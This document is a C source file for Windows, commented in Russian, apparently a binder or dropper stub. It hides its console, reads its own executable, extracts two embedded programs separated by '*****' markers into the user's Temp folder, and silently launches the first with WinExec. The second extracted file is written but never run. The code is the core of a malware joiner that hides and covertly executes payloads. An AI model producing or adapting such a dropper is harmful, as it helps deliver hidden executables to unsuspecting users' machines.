#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc, char * argv[]) {
	FreeConsole();	//скрываем консоль
    char buff[100];	//буфер для конконации
    DWORD dw=100;
    char buf;	//буфер для символов
    int i=0;	//счётчик
    int trigger1=0;
    char users[11] = "C:\\Users\\";
    char path[MAX_PATH];
    char first[MAX_PATH];
    char next[24] = "\\AppData\\Local\\Temp\\";
    GetUserName(buff, &dw);
    snprintf(path, sizeof path, "%s%s%s", users, buff, next );	//получаем путь в C:\Users\username\AppData\local\Temp
    snprintf(first, sizeof first, "%s%s", path, "\\source1.exe"); //путь до первого файла
    FILE *f1, *f2;	//дискрипторы файлов
    f1= fopen(argv[0], "rb");	//открываем архв для чтения(самого себя)
    f2=fopen(first, "wb");	//открываем первый файл для чтения
	while(!feof(f1))	//цикл до конца файла
	{
		if(fread(&buf, 1, sizeof(buf), f1)>0)	//чтение из файла
		{
			if(trigger1==1)	//если триггер==1 пишем первый файл
			{
				fwrite(&buf, sizeof(buf), 1, f2);
			}
			if(trigger1==2)	//если триггер==2
			{
				fclose(f2);	//закрываем файл
				snprintf(first, sizeof first, "%s%s", path, "\\source2.exe");	//путь до второго файла
				f2=fopen(first, "wb");		//открываем фторой файл для записи
				trigger1++;	//увеличиваем триггер на 1
			}
			if(trigger1==3)	//если триггер==3
			{
				fwrite(&buf, sizeof(buf), 1, f2);	//пишем второй файл
			}
			if(buf=='*')	//если видим *
			{
				i++;	//увеличеваем i на 1
			}
			else i=0;	//иначе i=0
			if(i==5)	//если видим 5 *
			{
				i=0;	//i=0
				trigger1++;	// триггер+1
			}
		}
	}
	fclose(f2);	//закрываем второй файл
    fclose(f1);	//закрываем архив
    snprintf(first, sizeof first, "%s%s", path, "\\source1.exe");	//путь до первого файла
    WinExec(first, SW_NORMAL);	//открываем первый файл
	return EXIT_SUCCESS;	//завершение программы
	}
